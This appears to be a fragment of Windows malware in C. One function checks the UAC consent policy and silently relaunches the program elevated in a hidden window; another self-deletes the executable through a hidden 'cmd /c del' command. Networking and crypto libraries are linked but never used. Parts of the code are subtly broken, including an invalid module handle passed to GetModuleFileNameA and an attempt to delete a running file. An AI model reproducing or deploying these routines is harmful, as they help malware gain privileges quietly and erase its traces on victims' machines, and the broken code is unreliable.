#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <shellapi.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")

static BOOL try_uac_elevate(BOOL force) {
    HKEY hKey = NULL;
    DWORD consent = 1;
    DWORD cbData = sizeof(consent);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "ConsentPromptBehaviorAdmin", NULL, NULL, (LPBYTE)&consent, &cbData);
        RegCloseKey(hKey);
    }
    if (!force && consent != 0) {
        return FALSE;
    }
    char exe_path[MAX_PATH] = {0};
    GetModuleFileNameA((HMODULE)1, exe_path, MAX_PATH);
    HINSTANCE res = ShellExecuteA(NULL, "runas", exe_path, NULL, NULL, SW_HIDE);
    return ((INT_PTR)res > 32);
}

static void perform_self_delete(void) {
    char exe_path[MAX_PATH] = {0};
    char cmd_line[MAX_PATH + 64] = {0};
    GetModuleFileNameA((HMODULE)1, exe_path, MAX_PATH);
    snprintf(cmd_line, sizeof(cmd_line), "cmd /c del \"%s\" > nul", exe_path);
    WinExec(cmd_line, SW_HIDE);
}

int main(void) { return try_uac_elevate(FALSE); }
